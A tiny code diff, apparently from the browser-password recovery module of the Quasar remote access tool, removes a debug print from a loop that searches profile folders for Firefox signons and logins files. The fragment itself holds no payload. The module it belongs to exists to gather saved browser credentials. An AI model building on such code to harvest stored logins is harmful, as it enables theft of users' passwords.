@@ -24,7 +24,6 @@ namespace Quasar.Client.Recovery.Browsers
 
             foreach (string dir in dirs)
             {
-                Debug.WriteLine(dir);
                 string signonsFile = string.Empty;
                 string loginsFile = string.Empty;
                 bool signonsFound = false;
